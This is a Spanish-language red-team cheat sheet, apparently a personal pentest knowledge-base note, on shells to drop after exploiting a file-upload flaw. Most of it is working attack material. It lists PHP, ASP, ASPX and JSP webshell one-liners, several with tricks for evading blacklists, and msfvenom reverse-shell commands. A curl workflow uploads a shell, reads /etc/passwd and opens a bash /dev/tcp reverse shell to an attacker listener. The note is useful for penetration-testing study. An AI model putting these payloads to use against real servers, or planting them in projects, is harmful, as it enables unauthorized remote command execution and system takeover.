---
aliases:
tags:
  - vuln/file-upload
  - technique/execution
  - asset/web-app
primary categories:
  - "[[Red Team]]"
secondary categories:
  - "[[Explotación]]"
  - "[[Web]]"
tertiary categories:
  - "[[Web Explotación]]"
kind: SubCheatSheet
linked:
  - "[[File Upload - Vulnerabilidades]]"
---
# File Upload - Shells en PHP

---

## Cheatsheet

| **Shell payload** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `<?php system($_REQUEST['cmd']); ?>` | Webshell estándar — `?cmd=whoami` | PHP backend, `system` no bloqueado. |
| `<?= \`$_GET[0]\` ?>` | Webshell minificada — backticks ejecutan shell. URL: `?0=id` | Short open tag habilitado. Útil con límite de longitud. |
| `<?php passthru($_GET['c']); ?>` | Alternativa cuando `system` filtrado | `passthru` no bloqueado. |
| `<?php echo shell_exec($_GET['c']); ?>` | Alternativa, devuelve solo stdout | `shell_exec` no bloqueado. |
| `<?php echo exec($_GET['c']); ?>` | Devuelve última línea de output | Fallback. |
| `<?php $a=$_GET['a']; $a($_GET['c']); ?>` (URL: `?a=system&c=id`) | Función dinámica — bypassea blacklist de keywords | WAF filtra `system`/`passthru` literal. |
| `<?php eval($_POST['c']); ?>` | Eval directo de PHP code (POST `c=system('id');`) | Más flexible que webshell de comando único. |
| `<?php assert($_GET['c']); ?>` | `assert()` ejecuta string como PHP code | Bypass cuando `eval` deshabilitado. |
| `<% eval request("cmd") %>` (`.asp`) | Webshell ASP clásica para IIS | Backend Windows/IIS legacy. |
| `<%@ Page Language="C#" %><% Response.Write(System.Diagnostics.Process.Start(new System.Diagnostics.ProcessStartInfo("cmd","/c "+Request["cmd"]){RedirectStandardOutput=true,UseShellExecute=false}).StandardOutput.ReadToEnd()); %>` (`.aspx`) | Webshell ASP.NET | IIS moderno. |
| `<%= Runtime.getRuntime().exec(request.getParameter("cmd")) %>` (`.jsp`) | Webshell JSP | Backend Tomcat/Jetty. |
| `msfvenom -p php/reverse_php LHOST=<IP> LPORT=<PORT> -f raw > rev.php` | Reverse shell PHP generada por MSF | Cuando necesitás integración con Metasploit handler. |
| pentestmonkey `php-reverse-shell.php` (cambiar IP/PORT) | Reverse shell con bash conexión saliente | Backend egress libre. |
| `revshells.com` (generador online) | Payload custom para stack/lang específico | Quick payload generation. |
^fu-shells

### Webshell mínima vs reverse shell

| **Tipo** | **Mecanismo** | **Cuándo** |
|:---:|:---:|:---:|
| Webshell (in-band) | Visitar URL → ejecuta cmd y refleja output en response | Server ejecuta + responde HTTP. PoC rápido. |
| Reverse shell | Server conecta a tu listener (`nc -lvnp <PORT>`) | Shell interactiva, egress permitido. |
| Bind shell (raro en web) | Server abre puerto y vos conectás | Egress bloqueado pero ingress abierto al server. |

### Tools y wordlists de shells

| **Recurso** | **Uso** |
|:---:|:---:|
| `/usr/share/webshells/` (Kali) | Repo built-in de webshells por lenguaje. |
| `/opt/useful/SecLists/Web-Shells/` | SecLists payload library. |
| `phpbash.php` | Webshell con UI tipo terminal — más cómoda que GET. |
| `wso.php`, `b374k`, `c99` | Webshells "feature-rich" con file manager, SQL, etc. **Cuidado**: muchas tienen backdoors. |
| [revshells.com](https://www.revshells.com/) | Generador online — bash/nc/python/php/perl/powershell. |
| `msfvenom -l payloads \| grep reverse_php` | Listar payloads PHP de Metasploit. |

### Workflow

```bash
# 1. Generar shell PHP minificada
cat > shell.php <<'EOF'
<?= `$_GET[0]` ?>
EOF

# 2. Subir + ubicar path
curl -F 'file=@shell.php' https://target/upload -v 2>&1 | grep -i location

# 3. Ejecutar comandos
curl 'https://target/uploads/shell.php?0=id'
curl 'https://target/uploads/shell.php?0=cat+/etc/passwd'

# 4. Upgrade a reverse shell
LHOST="10.10.10.10"
LPORT="4444"
nc -lvnp $LPORT &

curl "https://target/uploads/shell.php?0=bash+-c+'bash+-i+>%26+/dev/tcp/$LHOST/$LPORT+0>%261'"

# 5. Post-exploitation
# Estabilizar TTY
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Ctrl+Z, en tu host: stty raw -echo; fg
# en remoto: export TERM=xterm-256color
```

---

## Overview

Tipos principales de payload post-upload:

1. **Webshell** — archivo en server, ejecuta cmd via GET/POST. PoC rápido, persistente.
2. **Reverse shell** — server inicia conexión saliente a vos. Shell interactiva.
3. **Bind shell** — server bindea puerto, vos conectás. Raro en web (firewall ingress).

PHP backticks `` `cmd` `` + short tag `<?=` = shell más corta posible (`<?= \`$_GET[0]\` ?>`, 18 chars).

Si `system`/`exec`/`passthru` bloqueados → `assert($_GET['c'])` o eval con base64 (`eval(base64_decode($_GET['c']))`).

---
